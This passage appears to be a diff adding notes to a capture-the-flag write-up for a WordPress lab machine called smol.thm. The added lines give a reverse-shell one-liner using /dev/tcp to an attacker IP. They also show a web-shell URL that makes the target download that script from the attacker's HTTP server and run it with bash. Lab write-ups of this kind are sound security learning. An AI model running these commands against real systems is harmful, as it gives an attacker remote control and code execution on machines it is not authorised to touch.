@@ -402,4 +402,9 @@ define( 'DB_COLLATE', '' );
 
 > [!note]
 > Took a little while to figure this out but got there in the end.
-> First create a txt file for the rev shell called webshell.sh and got a little help generating the script for it with rev shell generator and AI: sh -i >& /dev/tcp/192.168.148.210/4444 0>&1 which was then piped into bash to as
+> First create a txt file for the rev shell called webshell.sh and got a little help generating the script for it with rev shell generator and AI: sh -i >& /dev/tcp/192.168.148.210/4444 0>&1 which was then piped into bash to activate the cmd.
+> 
+> python3 -m http.server 8000 was used to send the file locally from my PC to smol.thm via the custom url: http://www.smol.thm/wp-admin/index.php?cmd=wget%20http://192.168.148.210:8000/webshell.sh%20-O%20/tmp/w.sh%3Bbash%20/tmp/w.sh
+
+
+
